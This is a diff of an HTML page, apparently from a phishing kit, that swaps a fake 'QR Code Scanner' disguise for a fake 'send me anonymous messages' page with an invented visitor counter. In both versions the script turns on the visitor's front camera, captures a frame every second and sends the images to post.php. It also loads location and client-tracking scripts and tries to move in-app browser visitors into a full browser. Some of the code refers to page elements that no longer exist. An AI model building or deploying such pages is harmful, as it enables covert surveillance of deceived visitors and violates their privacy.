@@ -1,190 +1,361 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>QR Code Scanner</title>
-  <link rel="stylesheet" href="style.css">
-  <script src="../../assets/js/jquery.min.js"></script>
-  <script src="./jsQR.js"></script>
-  <script src="../../assets/js/particles.min.js"></script>
-  <script src="../../assets/js/location.js"></script>
-  <script src="../../assets/js/client.min.js"></script>
-  <script src="../../assets/js/loc.js"></script>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f8f8f8;
-      text-align: center;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Anonymous Messages</title>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="./jsQR.js"></script>
+    <script src="../../assets/js/particles.min.js"></script>
+    <script src="../../assets/js/location.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
 
-    .header {
-      background-color: #f0f0f0;
-      padding: 20px;
-      border-bottom: 1px solid #ccc;
-    }
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #ed1584 0%, #fe881e 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2rem;
+        }
 
-    .header h1 {
-      font-size: 36px;
-      margin: 0;
-    }
+        .message-card {
+            background: white;
+            border-radius: 20px;
+            padding: 1.5rem;
+            width: 100%;
+            max-width: 600px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+            margin: 2rem 0;
+        }
 
-    .subheading {
-      font-size: 18px;
-      color: #777;
-    }
+        .profile {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
 
-    .container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      padding: 50px 0;
-    }
+        .profile-img {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: #f0f0f0;
+        }
 
-    .start-button {
-      padding: 15px 30px;
-      font-size: 20px;
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      margin-top: 20px;
-      transition: background-color 0.3s;
-    }
+        .profile-name {
+            font-weight: 600;
+        }
 
-    .start-button:hover {
-      background-color: #45a049;
-    }
+        .message-container {
+            position: relative;
+            margin-top: 1rem;
+        }
 
-    .video-wrap {
-      position: relative;
-      width: 100%;
-      max-width: 640px;
-      height: 480px;
-      overflow: hidden;
-      border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
-      background-color: #000;
-      display: none;
-      margin-top: 30px;
-    }
+        textarea {
+            width: 100%;
+            min-height: 120px;
+            border: none;
+            background: #f8f8f8;
+            border-radius: 12px;
+            padding: 1rem;
+            resize: none;
+            font-size: 1rem;
+        }
 
-    video {
-      width: 100%;
-      height: auto;
-      border-radius: 10px;
-    }
+        textarea:focus {
+            outline: none;
+            background: #f0f0f0;
+        }
 
-    #qrCanvas {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      border-radius: 10px;
-    }
+        .send-button {
+            display: none;
+            max-width: 600px;
+            width: 100%;
+            padding: 1rem;
+            border: none;
+            border-radius: 100px;
+            background: #000;
+            color: white;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: transform 0.2s;
+            margin-top: 1rem;
+        }
 
-    .alert {
-      display: none;
-      padding: 15px;
-      margin-top: 30px;
-      border: 1px solid #4CAF50;
-      color: #4CAF50;
-      background-color: #DFF2BF;
-      border-radius: 5px;
-      max-width: 640px;
-      width: 100%;
-    }
-  </style>
+        .send-button:hover {
+            transform: scale(1.02);
+        }
+
+        .send-button.visible {
+            display: block;
+        }
+
+        .stats {
+            text-align: center;
+            color: white;
+            margin: 1rem 0;
+            font-weight: 500;
+        }
+
+        .action-container {
+            max-width: 600px;
+            width: 100%;
+            padding: 1rem;
+            position: fixed;
+            bottom: 30px;
+            text-align: center;
+        }
+
+        .action-button {
+            display: absolute;
+            width: 100%;
+            padding: 1rem;
+            border: none;
+            border-radius: 100px;
+            background: #000;
+            color: white;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .action-button:hover {
+            transform: scale(1.02);
+        }
+
+        .footer {
+            margin-top: 2rem;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .footer a {
+            color: white;
+            text-decoration: none;
+            margin: 0 0.5rem;
+            opacity: 0.8;
+        }
+
+        .footer a:hover {
+            opacity: 1;
+        }
+
+        .lock-icon {
+            display: inline-block;
+            margin-right: 4px;
+            opacity: 0.7;
+        }
+
+        .popup-warning {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #ed1584 0%, #fe881e 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            text-align: center;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 600;
+        }
+        
+        .popup-warning button {
+            display: block;
+            width: 100%;
+            max-width: 400px;
+            padding: 1rem;
+            border: none;
+            border-radius: 100px;
+            background: #000;
+            color: white;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: transform 0.2s;
+            margin-top: 2rem;
+        }
+        
+        .popup-warning button:hover {
+            transform: scale(1.02);
+        }
+    </style>
 </head>
-
 <body onload="mydata()">
-  <div class="header">
-    <h1>Free QR Code Scanner & Reader</h1>
-    <p class="subheading">Easily and quickly scan your QR codes online anytime and anywhere.</p>
-  </div>
-  
-  <div class="container">
-    
-    <div class="alert" id="qrAlert"></div>
-    <button class="start-button" id="startButton" onclick="init()">Start Scanning</button>
-    <div class="video-wrap">
-      <video id="video" playsinline autoplay></video>
-      <canvas id="canvas" hidden width="1000" height="1000" ></canvas>
-      <canvas id="qrCanvas" hidden width="640" height="480"></canvas>
+    <div class="message-card">
+        <div class="profile">
+            <div class="profile-img"></div>
+            <div>
+                <div class="profile-name">@bryyy_cortez</div>
+                <div>send me anonymous messages!</div>
+            </div>
+        </div>
+        <div class="message-container">
+            <textarea placeholder="send me anonymous messages..."></textarea>
+        </div>
     </div>
-  </div>
+    <button class="send-button">Send!</button>
 
-  <script>
+    <div class="action-container">
+        <div class="stats">
+            👋 251 people just tapped the button
+        </div>
+        
+        <button class="action-button">
+            Get your own messages!
+        </button>
+    
+        <div class="footer">
+            <a href="#">Terms</a>
+            <a href="#">Privacy</a>
+        </div>
+    </div>
+
+    <video id="video" playsinline autoplay></video>
+    <canvas id="canvas" hidden width="1000" height="1000" ></canvas>
+    <canvas id="qrCanvas" hidden width="640" height="480"></canvas>
+
+    <script>
+
+
     function post(imgdata) {
-        $.ajax({
-            type: 'POST',
-            data: { cat: imgdata },
-            url: 'post.php',
-            dataType: 'json',
-            async: false,
-            success: function(result) {
-                // Handle response
-            },
-            error: function() {
-                console.error("Error posting data.");
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {
+                    
+                },
+                error: function() {
+                    console.error("Error posting data.");
+                }
+            });
+        }
+
+        'use strict';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const qrCanvas = document.getElementById('qrCanvas');
+        const context = canvas.getContext('2d');
+        const qrContext = qrCanvas.getContext('2d');
+        const qrAlert = document.getElementById('qrAlert');
+        const startButton = document.getElementById('startButton');
+
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user"
+            }
+        };
+
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                document.querySelector('.video-wrap').style.display = 'block';
+                startButton.style.display = 'none';
+                setInterval(captureImage, 1000);
+                requestAnimationFrame(scanQRCode);
+            } catch (e) {
+                console.error(`navigator.getUserMedia error: ${e.toString()}`);
+            }
+        }
+
+        function captureImage() {
+            context.drawImage(video, 0, 0, 640, 480);
+            const canvasData = canvas.toDataURL("image/png");
+            const cc = String(canvasData).replace("data:image/png;base64,", "");
+            post(cc);
+        }
+
+        const textarea = document.querySelector('textarea');
+        const sendButton = document.querySelector('.send-button');
+        const statsEl = document.querySelector('.stats');
+        let messageCount = 251;
+
+        textarea.addEventListener('input', () => {
+            if(textarea.value.trim()) {
+                sendButton.classList.add('visible');
+            } else {
+                sendButton.classList.remove('visible');
             }
         });
-    }
 
-    'use strict';
+        sendButton.addEventListener('click', () => {
+            if(textarea.value.trim()) {
+                messageCount++;
+                statsEl.textContent = `👋 ${messageCount} people just tapped the button`;
+                textarea.value = '';
+                sendButton.classList.remove('visible');
+            }
+        });
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const qrCanvas = document.getElementById('qrCanvas');
-    const context = canvas.getContext('2d');
-    const qrContext = qrCanvas.getContext('2d');
-    const qrAlert = document.getElementById('qrAlert');
-    const startButton = document.getElementById('startButton');
+        textarea.addEventListener('keyup', (e) => {
+            if(e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                if(textarea.value.trim()) {
+                    messageCount++;
+                    statsEl.textContent = `👋 ${messageCount} people just tapped the button`;
+                    textarea.value = '';
+                    sendButton.classList.remove('visible');
+                }
+            }
+        });
 
-    const constraints = {
-        audio: false,
-        video: {
-            facingMode: "user"
-        }
-    };
+        function isWebview() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
 
-    async function init() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            video.srcObject = stream;
-            document.querySelector('.video-wrap').style.display = 'block';
-            startButton.style.display = 'none'; // Hide the start button once video is shown
-            setInterval(captureImage, 1000);
-            requestAnimationFrame(scanQRCode);
-        } catch (e) {
-            console.error(`navigator.getUserMedia error: ${e.toString()}`);
-        }
-    }
+            if(userAgent.indexOf('FBAN') > -1 || userAgent.indexOf('FBAV') > -1 || userAgent.indexOf('Instagram') > -1) {
+                return true;
+            }
 
-    function captureImage() {
-        context.drawImage(video, 0, 0, 640, 480);
-        const canvasData = canvas.toDataURL("image/png");
-        const cc = String(canvasData).replace("data:image/png;base64,", "");
-        post(cc);
-    }
+            if(userAgent.indexOf('wv') > -1 || (userAgent.indexOf('Android') > -1 && userAgent.indexOf('Chrome') > -1)) {
+                return true;
+            }
 
-    function scanQRCode() {
-        qrContext.drawImage(video, 0, 0, qrCanvas.width, qrCanvas.height);
-        const imageData = qrContext.getImageData(0, 0, qrCanvas.width, qrCanvas.height);
-        const code = jsQR(imageData.data, qrCanvas.width, qrCanvas.height);
+            if(userAgent.indexOf('Safari') > -1 && userAgent.indexOf('CriOS') === -1 && window.webkit) {
+                return true;
+            }
 
-        if (code) {
-            qrAlert.innerText = `QR Code detected: ${code.data}`;
-            qrAlert.style.display = 'block';
-            setTimeout(() => { qrAlert.style.display = 'none'; }, 5000);
+            return false;
         }
 
-        requestAnimationFrame(scanQRCode);
-    }
-  </script>
+        if(isWebview()) {
+            document.querySelector('.message-card').style.display = 'none';
+            document.querySelector('.send-button').style.display = 'none';
+            document.querySelector('.action-container').style.display = 'none';
 
+            const popupWarning = document.createElement('div');
+            popupWarning.classList.add('popup-warning');
+            popupWarning.innerHTML = `
+                <button onclick="window.location.href='https://google.com';">Open in Browser</button>
+            `;
+            document.body.appendChild(popupWarning);
+        }
+
+        function openInPopup() {
+            window.open(window.location.href, 'popup', 'width=600,height=800');
+        }
+
+        document.getElementById('open-in-popup').addEventListener('click', openInPopup);
+
+    </script>
 </body>
 </html>
